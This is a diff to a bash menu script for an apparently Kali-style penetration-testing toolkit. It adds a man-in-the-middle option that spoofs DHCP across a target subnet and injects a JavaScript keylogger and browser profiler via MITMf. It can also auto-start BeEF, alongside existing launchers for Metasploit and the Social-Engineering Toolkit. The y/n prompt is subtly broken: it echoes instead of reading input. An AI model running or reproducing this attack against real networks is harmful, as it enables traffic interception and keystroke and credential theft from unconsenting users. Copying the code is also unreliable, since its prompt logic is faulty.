@@ -51,8 +51,8 @@ f_wlan1check
 echo "				WIRELESS ATTACKS MAIN MENU"
 echo ""
 echo ""
-echo "[1]	Wifite"
-echo "[2]	Kismet"
+echo "[1]	Wifite - Auotmated Wireless Auditor"
+echo "[2]	Kismet - Wireless network detector, sniffer, IDS"
 echo ""
 echo "[0]	Exit"
 echo ""
@@ -172,6 +172,8 @@ else
   echo "All files copied successfully!";
 fi
 }
+
+
 ##########################   SNIFFING MENU     ###############################
 f_sniffing(){
 clear
@@ -292,6 +294,7 @@ echo ""
 echo "[1]	Metasploit"
 echo "[2]	Beef-XSS"
 echo "[3]	Social-Engineering Toolkit"
+echo "[4]	MITMf - Man-In-The-Middle attacks"
 echo ""
 echo "[0]	Exit to main menu"
 echo ""
@@ -301,13 +304,40 @@ case $webchoice in
 1) clear; echo "Msfconsole may take up to 5 minutes to load, please wait..."; service postgresql start; service metasploit start; msfconsole; f_exploitation ;;
 2) clear; service beef-xss start; echo "Open browser to http://127.0.0.1:3000/ui/panel (beef/beef)"; sleep 8; f_exploitation ;;
 3) clear; setoolkit ; f_exploitation ;;
+4) clear; trap 'f_exploitation' 2; f_mitmf ;;
 0) clear; f_interface ;;
 *) echo "Incorrect choice..." ;
 esac
 }
 
-f_metasploit(){
-msf4
+f_mitmf(){
+clear
+read -p "Enter Interface: " -e -i "wlan0" mitmf_interface
+read -p "Enter Gateway IP: " -e -i "192.168.1.1" mitmf_routerip
+read -p "Enter Target IP: " -e -i "192.168.1.0/24" mitmf_targetip
+if ps ax | grep -v grep | grep beef-xss > /dev/null
+	then
+		echo "Beef-xss is running.  Will load autobeef..."
+		mitmf_startbeef=--beefauto
+		sleep 3
+	else
+		echo "Beef-xss is not running.  Would you like to start? (y/n) " mitmf_beefstart 
+		if 	[ "$mitmf_beefstart" == "y" ]; then
+			echo "Starting beef-xss..."
+			service beef-xss start
+			mitmf_startbeef=--beefauto
+			sleep 5
+		else
+			mitmf_startbeef=""
+		fi
+fi
+cd /opt/MITMf
+echo "Logs saved to /captures/sslstrip/mitmf.log"
+echo ""
+echo "[*] ------------------------------------------------------"
+# Uncomment when beef-xss for MITMf is fixed #
+#python mitmf.py --spoof --dhcp --iface $mitmf_interface --gateway $mitmf_routerip --target $mitmf_targetip $mitmf_startbeef --jskeylogger --browserprofiler -w /captures/sslstrip/mitmf.log
+python mitmf.py --spoof --dhcp --iface $mitmf_interface --gateway $mitmf_routerip --target $mitmf_targetip --jskeylogger --browserprofiler -w /captures/sslstrip/mitmf.log
 }
 ########################## REVERSE MENU ################################
 f_reverse(){
